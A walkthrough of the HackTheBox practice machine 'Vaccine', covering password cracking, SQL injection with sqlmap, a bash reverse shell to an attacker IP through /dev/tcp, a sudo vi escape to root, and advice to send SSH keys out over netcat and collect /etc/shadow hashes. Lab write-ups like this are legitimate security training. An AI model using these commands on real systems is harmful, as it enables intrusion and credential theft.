*2021-08-15*

*kimm3*
# Walkthrough: Vaccine
Platform: HackTheBox, Starting Point

Difficulty: Very Easy

This is the third box in the starting point series.

The boxes build on each other so make sure to save credentials and other intersting information that you find.

## Info gathering and enumeration
**HTTP service**

![init-scan](assets/markdown-img-paste-20210815094145202.png)

Three well known services appear. Let's start with the web server.

![megacorp-login-post](assets/markdown-img-paste-20210815094738830.png)

![megacorp-loing-phpsessid](assets/markdown-img-paste-20210815094754703.png)

It's a login page for "MegaCorp", same company as the previous boxes. It contains a POST-form and stores a cookie with a PHP session id.

We have som plausible username and passwords that might get us in from the previous boxes, but lets check out the ftp service first.

**FTP service**

![ftp-access](assets/markdown-img-paste-20210815095425900.png)

The ftpuser account works to gain access to the ftp service, there's a zip file called 'backup.zip' which we can retrieve.

![zip-file-fail](assets/markdown-img-paste-20210815095555708.png)

The zip contains two files, index.php and style.css, that are password protected. The passwords we've saved from earlier dosen't work so we'll have to try to crack them.

First we have to generate a hash from the password, then we'll use hashcat combined with a big wordlist.

![zip2john](assets/markdown-img-paste-20210815100103776.png)

Generating the hash.

![crackcmd1](assets/markdown-img-paste-20210815101916342.png)

![zipcracked](assets/markdown-img-paste-20210815101136234.png)

Cracking the hash. Use the [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) to find the correct mode. It was suffice to do a simple dictionary attack and use the 'rockyou.txt'. Don't forget to clean up the hash file so that only the hash is processed(haschat won't recognize the original output from zip2john).

![index.php](assets/markdown-img-paste-20210815101343226.png)

This actually looks like the login page visited earlier, with some really static web programming - it checks for one set of credentials, admin and a md5 hash.

![crackcmd2](assets/markdown-img-paste-20210815101828756.png)

![indexcracked](assets/markdown-img-paste-20210815101855564.png)

Let's go back to the login page and try this out.

![dashboard](assets/markdown-img-paste-20210815102235164.png)

The page presents a catalog and a search function, no links. If we search for something, the URL changes to:

`http://10.10.10.46/dashboard.php?search=q`

Lets see if sqlmap can find any sqli vulnerabilities with this. Copy the url from the search bar and the cookie from firefox dev tools(ctrl+shift+e).

`sqlmap -u "http://10.10.10.46/dashboard.php?search=q" --cookie="PHPSESSID=8nd61fr6kvehdab0vq8h9m3mvf" --random-agent`

![sqlmap-init](assets/markdown-img-paste-20210815103321724.png)

We get some additional information about the host. It's a linux machine running apache and a postgresql database. A stacked query vulnerability is found.

We can check if the current user is dba(database administrator) and the current database with `--is-dba --current-database`. The user is indeed dba. To further enumerate the the database, use `-D public --schema`-

![is-dba](assets/markdown-img-paste-20210815103756482.png)
![current-database](assets/markdown-img-paste-20210815103816196.png)
![db-schema](assets/markdown-img-paste-20210815103836469.png)

The schema looks like everything we can see in the browser, not that interesting.
## Foothold
With sqlmap, we can use the `--os-shell` to land a shell.

![os-shell](assets/markdown-img-paste-20210815104103492.png)

To get a proper shell, I first tried this one-liner from [payloadsallthethings cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

![bash-tcp](assets/markdown-img-paste-20210815104224851.png)

![bash-not-working](assets/markdown-img-paste-20210815104758415.png)

It dosen't seem to work to run it directly in the shell. So lets create a file and run it with bash.

```
echo "bash -i >& /dev/tcp/10.10.16.37/1234 0>&1" > s.sh
chmod u+x s.sh
bash s.sh
```

![bash-shell](assets/markdown-img-paste-20210815110303197.png)
## Privilege escalation
![users](assets/markdown-img-paste-20210815110526886.png)

There seems to be two users, ftpuser and simon.

![password-postgres](assets/markdown-img-paste-20210815111439110.png)

There's a password in the dashboard.php for the postgres user. Now that we have the password we can see if we can run anything as sudo.

![sudo-l](assets/markdown-img-paste-20210815112349159.png)

We can run vi to edit a database config file, which is good since you can run shell commands from inside vi.

![getting-root](assets/markdown-img-paste-20210815112708634.png)

Run the command with sudo, inside vi do:
`:!/bin/bash/` and you get the shell as root.

The flag is in the '/root' folder as usual.

## Post Exploitation
A bunch of ssh keys is lying around in `/etc/ssh/` folder. You can send them over with netcat.


As root, you can get the password hashes for simon and root in `/etc/shadow` for offline cracking.
